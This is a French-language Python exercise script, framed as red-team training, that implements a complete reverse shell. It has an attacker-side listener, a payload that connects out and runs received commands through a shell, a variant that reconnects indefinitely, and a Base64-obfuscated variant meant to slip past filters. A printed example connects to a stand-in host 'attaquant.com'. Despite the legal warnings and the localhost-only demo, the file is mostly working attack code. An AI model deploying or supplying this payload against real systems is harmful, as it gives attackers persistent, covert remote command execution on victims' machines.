#!/usr/bin/env python3
"""
Exercice 18 : Reverse Shell en Python
Démonstration complète d'une reverse shell avec applications red teaming

AVERTISSEMENT SÉCURITÉ MAJEUR:
=============================
Ces techniques sont DESTINÉES À L'APPRENTISSAGE ET AUX TESTS AUTORISÉS UNIQUEMENT.

L'utilisation sur des systèmes sans autorisation écrite est CRIMINELLE et peut entraîner:
- Poursuites pénales graves
- Prison (plusieurs années selon juridiction)
- Amendes substantielles
- Antécédents judiciaires permanents

JAMAIS utiliser:
- Sur des systèmes sans autorisation explicite écrite
- Sur les données ou réseaux d'autres personnes
- Pour l'accès non autorisé, le vol de données, ou le sabotage

USAGE LÉGAL UNIQUEMENT:
- Red teaming avec contrat signé
- Tests de pénétration avec ROE (Rules of Engagement)
- Environnements sandbox/VM pour apprentissage
- Recherche en sécurité autorisée
"""

import socket
import subprocess
import os
import sys
import time
import threading
import base64
import hashlib
from typing import Tuple, Optional
import platform

# =============================================================================
# PARTIE 1 : CONCEPTS DE BASE - REVERSE SHELL SIMPLE
# =============================================================================

def exemple_socket_basique():
    """
    Exemple basique de socket pour comprendre la communication TCP
    """
    print("\n" + "="*70)
    print("PARTIE 1 : CONCEPTS DE BASE - COMMUNICATIONS SOCKET")
    print("="*70)

    # 1. Création d'une socket serveur (côté attaquant)
    print("\n1. SOCKET SERVEUR (Handler/Listener) - Côté Attaquant:")
    print("-" * 70)
    print("""
    # Créer socket serveur
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Lier à l'adresse et port
    server_socket.bind(('0.0.0.0', 4444))

    # Écouter les connexions entrantes (backlog=1)
    server_socket.listen(1)
    print("En attente de connexion sur 0.0.0.0:4444...")

    # Accepter une connexion (bloque jusqu'à client)
    client_socket, client_addr = server_socket.accept()
    print(f"Client connecté depuis {client_addr}")

    # Recevoir données
    data = client_socket.recv(1024)  # Max 1024 bytes
    print(f"Reçu: {data.decode('utf-8')}")

    # Envoyer réponse
    client_socket.send(b"Commande reçue")
    client_socket.close()
    """)

    # 2. Création d'une socket client (côté cible)
    print("\n2. SOCKET CLIENT (Payload) - Côté Système Cible:")
    print("-" * 70)
    print("""
    # Créer socket client
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Établir connexion vers attaquant
    client_socket.connect(('attaquant.com', 4444))
    print("Connecté à attaquant.com:4444")

    # Envoyer données
    client_socket.send(b"Payload actif")

    # Recevoir commande
    commande = client_socket.recv(1024)
    print(f"Commande reçue: {commande.decode('utf-8')}")

    # Envoyer réponse
    client_socket.send(b"Résultat exécution")
    client_socket.close()
    """)


def exemple_execution_commandes():
    """
    Exemple d'exécution de commandes et capture output
    """
    print("\n" + "="*70)
    print("PARTIE 2 : EXÉCUTION DE COMMANDES ET CAPTURE OUTPUT")
    print("="*70)

    # 1. Exécution simple avec subprocess
    print("\n1. Exécution simple de commande:")
    print("-" * 70)

    try:
        # Déterminer la commande selon le système
        if platform.system() == "Windows":
            commande = "dir"
        else:
            commande = "ls -la /tmp"

        print(f"   Commande: {commande}")

        # Exécuter via subprocess (recommandé)
        if platform.system() == "Windows":
            process = subprocess.Popen(
                commande,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        else:
            process = subprocess.Popen(
                commande.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

        # Communiquer avec le processus
        stdout, stderr = process.communicate()

        # Afficher résultats
        print(f"   Sortie standard ({len(stdout)} chars):")
        lignes = stdout.split('\n')[:3]
        for ligne in lignes:
            if ligne:
                print(f"      {ligne[:60]}")

        print(f"   Code de sortie: {process.returncode}")
        if stderr:
            print(f"   Erreur: {stderr[:100]}")

    except Exception as e:
        print(f"   Erreur: {e}")

    # 2. Exécution avec timeout
    print("\n2. Exécution avec timeout (10s max):")
    print("-" * 70)

    try:
        if platform.system() == "Windows":
            process = subprocess.Popen(
                "timeout 2",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        else:
            process = subprocess.Popen(
                ["sleep", "2"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

        try:
            stdout, stderr = process.communicate(timeout=10)
            print(f"   Processus terminé normalement (code: {process.returncode})")
        except subprocess.TimeoutExpired:
            process.kill()
            print("   Timeout! Processus tué après 10s")

    except Exception as e:
        print(f"   Erreur: {e}")

    # 3. Exécution interactive (Popen plus avancé)
    print("\n3. Exécution interactive (Popen avancé):")
    print("-" * 70)
    print("""
    # Pour une vrai reverse shell, on utilisera:
    process = subprocess.Popen(
        commande,
        stdin=subprocess.PIPE,      # Accepter input
        stdout=subprocess.PIPE,     # Capturer output
        stderr=subprocess.PIPE,     # Capturer erreurs
        text=True,                  # Mode texte
        shell=True                  # Shell nécessaire pour certaines commandes
    )

    # Communiquer
    stdout, stderr = process.communicate(
        input="données",
        timeout=30
    )
    """)


# =============================================================================
# PARTIE 3 : REVERSE SHELL - HANDLER (SERVEUR D'ÉCOUTE)
# =============================================================================

class ReverseShellHandler:
    """
    Handler (Listener) : Côté Attaquant
    Écoute les connexions et envoie des commandes au payload
    """

    def __init__(self, port: int = 4444):
        """
        Initialise le handler

        Args:
            port: Port d'écoute (défaut: 4444)
        """
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_addr = None

    def demarrer(self):
        """
        Démarre le handler et attend une connexion
        """
        try:
            # Créer socket serveur
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Permettre réutilisation du port (SO_REUSEADDR)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            # Lier à toutes les interfaces (0.0.0.0) et port spécifié
            self.server_socket.bind(('0.0.0.0', self.port))

            # Écouter (backlog=5 = max 5 connexions en attente)
            self.server_socket.listen(5)

            print(f"\n[HANDLER] Démarré sur 0.0.0.0:{self.port}")
            print(f"[HANDLER] En attente de connexion du payload...")

            # Accepter une connexion (BLOQUE jusqu'à client)
            self.client_socket, self.client_addr = self.server_socket.accept()

            print(f"[HANDLER] Payload connecté depuis {self.client_addr[0]}:{self.client_addr[1]}")
            return True

        except Exception as e:
            print(f"[ERREUR HANDLER] Impossible de démarrer: {e}")
            return False

    def boucle_interactive(self):
        """
        Boucle interactive pour envoyer des commandes et recevoir résultats
        """
        if not self.client_socket:
            print("[ERREUR] Pas de client connecté")
            return

        print("\n[HANDLER] Boucle interactive (tapez 'exit' pour quitter)")
        print("-" * 70)

        try:
            while True:
                # Afficher prompt
                commande = input("\n[shell] > ").strip()

                # Vérifier exit
                if commande.lower() in ['exit', 'quit', 'bye']:
                    print("[HANDLER] Fermeture de la session...")
                    break

                # Vérifier commande vide
                if not commande:
                    continue

                # Envoyer commande au payload
                try:
                    self.client_socket.send(commande.encode('utf-8') + b'\n')
                except Exception as e:
                    print(f"[ERREUR] Impossible d'envoyer commande: {e}")
                    break

                # Recevoir résultats (bloque jusqu'à 4096 bytes)
                try:
                    resultats = self.client_socket.recv(4096).decode('utf-8')

                    if resultats:
                        print(resultats, end='')
                    else:
                        print("[HANDLER] Connexion fermée par le client")
                        break

                except Exception as e:
                    print(f"[ERREUR] Impossible de recevoir résultats: {e}")
                    break

        except KeyboardInterrupt:
            print("\n[HANDLER] Interruption utilisateur")

        finally:
            self.fermer()

    def fermer(self):
        """Ferme les connexions proprement"""
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        print("[HANDLER] Sockets fermées")


# =============================================================================
# PARTIE 4 : REVERSE SHELL - PAYLOAD (CLIENT)
# =============================================================================

class ReverseShellPayload:
    """
    Payload (Client) : Côté Système Cible
    Se connecte au handler et exécute les commandes reçues
    """

    def __init__(self, attaquant_ip: str, attaquant_port: int = 4444):
        """
        Initialise le payload

        Args:
            attaquant_ip: IP du handler/attaquant
            attaquant_port: Port du handler (défaut: 4444)
        """
        self.attaquant_ip = attaquant_ip
        self.attaquant_port = attaquant_port
        self.socket = None

    def connecter(self) -> bool:
        """
        Établit la connexion vers le handler

        Returns:
            True si succès, False sinon
        """
        try:
            # Créer socket client
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connecter vers handler
            self.socket.connect((self.attaquant_ip, self.attaquant_port))

            print(f"[PAYLOAD] Connecté à {self.attaquant_ip}:{self.attaquant_port}")
            return True

        except Exception as e:
            print(f"[ERREUR PAYLOAD] Impossible de se connecter: {e}")
            return False

    def executer_commande(self, commande: str) -> str:
        """
        Exécute une commande et retourne l'output

        Args:
            commande: Commande à exécuter

        Returns:
            Sortie standard + erreurs
        """
        try:
            # Détecter système d'exploitation
            shell = True if platform.system() == "Windows" else True

            # Exécuter commande
            process = subprocess.Popen(
                commande,
                shell=True,                    # Utiliser le shell
                stdout=subprocess.PIPE,        # Capturer stdout
                stderr=subprocess.STDOUT,      # Rediriger stderr vers stdout
                text=True,                     # Mode texte
                cwd=os.getcwd()                # Répertoire courant
            )

            # Communiquer et timeout 30s
            try:
                stdout, _ = process.communicate(timeout=30)
                return stdout

            except subprocess.TimeoutExpired:
                process.kill()
                return "[TIMEOUT] Commande a dépassé 30 secondes\n"

        except Exception as e:
            return f"[ERREUR EXÉCUTION] {str(e)}\n"

    def boucle_reception(self):
        """
        Boucle de réception des commandes et exécution
        """
        if not self.socket:
            print("[ERREUR] Pas de connexion établie")
            return

        print(f"[PAYLOAD] Boucle de réception des commandes")
        print("-" * 70)

        try:
            while True:
                # Recevoir commande (bloque jusqu'à données)
                donnees = self.socket.recv(1024)

                # Vérifier déconnexion
                if not donnees:
                    print("[PAYLOAD] Handler déconnecté")
                    break

                # Décoder commande
                commande = donnees.decode('utf-8').strip()

                # Exécuter commande
                if commande:
                    resultats = self.executer_commande(commande)
                else:
                    resultats = ""

                # Envoyer résultats
                try:
                    self.socket.send(resultats.encode('utf-8'))
                except Exception as e:
                    print(f"[ERREUR] Impossible d'envoyer résultats: {e}")
                    break

        except KeyboardInterrupt:
            print("[PAYLOAD] Interruption")

        except Exception as e:
            print(f"[ERREUR PAYLOAD] {e}")

        finally:
            self.fermer()

    def fermer(self):
        """Ferme la connexion"""
        if self.socket:
            self.socket.close()
        print("[PAYLOAD] Connexion fermée")


# =============================================================================
# PARTIE 5 : AMÉLIORATION 1 - PERSISTANCE BASIQUE
# =============================================================================

class ReverseShellAvecPersistance:
    """
    Reverse Shell avec persistance basique
    Reconnecter automatiquement si la connexion est perdue
    """

    def __init__(self, attaquant_ip: str, attaquant_port: int = 4444,
                 intervalle_reconnexion: int = 5):
        """
        Args:
            attaquant_ip: IP du handler
            attaquant_port: Port du handler
            intervalle_reconnexion: Attendre X secondes avant de reconnecter
        """
        self.attaquant_ip = attaquant_ip
        self.attaquant_port = attaquant_port
        self.intervalle_reconnexion = intervalle_reconnexion
        self.socket = None

    def connecter_avec_persistance(self) -> bool:
        """
        Connecter avec retry automatique

        Tentatives infinies avec backoff exponentiel
        """
        tentative = 0
        delai_base = 1  # 1 seconde initiale

        while True:
            tentative += 1

            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.attaquant_ip, self.attaquant_port))

                print(f"[PERSISTANCE] Connecté après {tentative} tentative(s)")
                return True

            except Exception as e:
                # Calculer délai avec backoff exponentiel (max 60s)
                delai = min(delai_base * (2 ** (tentative - 1)), 60)

                print(f"[PERSISTANCE] Connexion échouée tentative {tentative}")
                print(f"[PERSISTANCE] Prochaine tentative dans {delai}s...")

                time.sleep(delai)

    def boucle_reception(self):
        """
        Boucle de réception avec reconnexion automatique
        """
        while True:
            # Connecter si nécessaire
            if not self.socket:
                if not self.connecter_avec_persistance():
                    continue

            try:
                # Recevoir commande
                donnees = self.socket.recv(1024)

                if not donnees:
                    print("[PERSISTANCE] Déconnexion, tentative de reconnexion...")
                    self.socket = None
                    continue

                # Exécuter commande
                commande = donnees.decode('utf-8').strip()

                if commande:
                    resultats = self._executer_commande(commande)
                else:
                    resultats = ""

                # Envoyer résultats
                self.socket.send(resultats.encode('utf-8'))

            except Exception as e:
                print(f"[PERSISTANCE] Erreur: {e}")
                self.socket = None
                time.sleep(self.intervalle_reconnexion)

    def _executer_commande(self, commande: str) -> str:
        """Exécuter commande (même logique que ReverseShellPayload)"""
        try:
            process = subprocess.Popen(
                commande,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            try:
                stdout, _ = process.communicate(timeout=30)
                return stdout
            except subprocess.TimeoutExpired:
                process.kill()
                return "[TIMEOUT]\n"

        except Exception as e:
            return f"[ERREUR] {str(e)}\n"


# =============================================================================
# PARTIE 6 : AMÉLIORATION 2 - OBFUSCATION BASIQUE
# =============================================================================

class ReverseShellObfusquee:
    """
    Reverse Shell avec obfuscation basique
    - Encodage Base64 des communications
    - Minimise signatures
    """

    def __init__(self, attaquant_ip: str, attaquant_port: int = 4444):
        self.attaquant_ip = attaquant_ip
        self.attaquant_port = attaquant_port
        self.socket = None

    def encoder_message(self, message: str) -> bytes:
        """
        Encode un message en Base64

        Obfuscation basique: transforme texte en base64
        Contourne certains filtres simples
        """
        return base64.b64encode(message.encode('utf-8'))

    def decoder_message(self, donnees: bytes) -> str:
        """Décode un message Base64"""
        try:
            return base64.b64decode(donnees).decode('utf-8')
        except Exception:
            return ""

    def connecter(self) -> bool:
        """Établir connexion"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.attaquant_ip, self.attaquant_port))
            return True
        except Exception as e:
            print(f"[OBFUSCATION] Erreur connexion: {e}")
            return False

    def boucle_reception(self):
        """
        Boucle avec communications encodées en Base64
        """
        if not self.socket:
            return

        print("[OBFUSCATION] Boucle avec encodage Base64")

        try:
            while True:
                # Recevoir commande encodée
                donnees_encodees = self.socket.recv(1024)

                if not donnees_encodees:
                    break

                # Décoder commande
                commande = self.decoder_message(donnees_encodees)

                if not commande:
                    continue

                # Exécuter et encoder résultats
                resultats = self._executer_commande(commande)
                resultats_encodes = self.encoder_message(resultats)

                # Envoyer résultats encodés
                self.socket.send(resultats_encodes)

        except Exception as e:
            print(f"[OBFUSCATION] Erreur: {e}")

        finally:
            if self.socket:
                self.socket.close()

    def _executer_commande(self, commande: str) -> str:
        """Exécuter commande"""
        try:
            process = subprocess.Popen(
                commande,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            try:
                stdout, _ = process.communicate(timeout=30)
                return stdout
            except subprocess.TimeoutExpired:
                process.kill()
                return "[TIMEOUT]\n"

        except Exception as e:
            return f"[ERREUR] {str(e)}\n"


# =============================================================================
# PARTIE 7 : DÉMONSTRATION COMPLÈTE
# =============================================================================

def demonstration_complete():
    """
    Démonstration complète (mode simulé local)
    """
    print("\n" + "="*70)
    print("PARTIE 7 : DÉMONSTRATION COMPLÈTE (MODE SIMULÉ LOCAL)")
    print("="*70)

    print("\n[MODE SIMULÉ] Les deux processes (handler et payload) s'exécutent en")
    print("local pour démonstration. En réalité, ils seraient sur des machines différentes.")
    print("-" * 70)

    # 1. Afficher l'architecture
    print("\nArchitecture (Simulée en Local):")
    print("""
    Handler (Localhost:4444)          Payload (Localhost Client)
    ├── Écoute :4444           ----→  ├── Se connecte localhost:4444
    ├── Reçoit "whoami"        ----→  ├── Exécute whoami
    ├── Reçoit résultat        ←----  ├── Envoie résultat
    └── Affiche résultat              └── Boucle reception
    """)

    # 2. Créer handler
    handler = ReverseShellHandler(port=4444)

    # 3. Créer payload
    payload = ReverseShellPayload("localhost", 4444)

    # 4. Démarrer handler dans un thread
    print("\n[DEMO] Démarrage du handler...")
    handler_thread = threading.Thread(target=handler.demarrer)
    handler_thread.daemon = True
    handler_thread.start()

    # Attendre que handler soit prêt
    time.sleep(1)

    # 5. Connecter payload dans un thread
    print("[DEMO] Connexion du payload...")
    payload_thread = threading.Thread(target=payload.connecter)
    payload_thread.daemon = True
    payload_thread.start()

    payload_thread.join(timeout=5)

    # 6. Démarrer payload dans un thread
    print("[DEMO] Démarrage de la boucle de réception du payload...\n")
    reception_thread = threading.Thread(target=payload.boucle_reception)
    reception_thread.daemon = True
    reception_thread.start()

    # 7. Démarrer boucle interactive du handler
    handler.boucle_interactive()

    # Attendre threads
    reception_thread.join(timeout=5)


# =============================================================================
# MAIN
# =============================================================================

def main():
    """
    Point d'entrée principal
    """
    print("\n" + "="*70)
    print("EXERCICE 18 : REVERSE SHELL EN PYTHON")
    print("="*70)

    print("\nAVERTISSEMENT ÉTHIQUE:")
    print("-" * 70)
    print("Cette matière couvre des techniques offensives de cybersécurité.")
    print("Usage LÉGAL UNIQUEMENT sur environnements autorisés.")
    print("Utilisation non autorisée = crime.")
    print()

    # Afficher les parties
    exemple_socket_basique()
    exemple_execution_commandes()

    print("\n" + "="*70)
    print("PARTIE 3-6 : CODE COMPLET REVERSE SHELL")
    print("="*70)

    print("\nLe code contient les classes:")
    print("  - ReverseShellHandler: Handler (serveur d'écoute côté attaquant)")
    print("  - ReverseShellPayload: Payload (client côté cible)")
    print("  - ReverseShellAvecPersistance: Avec reconnexion automatique")
    print("  - ReverseShellObfusquee: Avec encodage Base64")
    print("\nPour exécuter une démo complète (mode simulé local):")
    print("  - Décommenter 'demonstration_complete()' ci-dessous")
    print("  - OU utiliser les classes directement (voir exercices)")

    # Démo complète désactivée par défaut pour sécurité
    # Décommenter pour tester:
    # demonstration_complete()


if __name__ == "__main__":
    main()
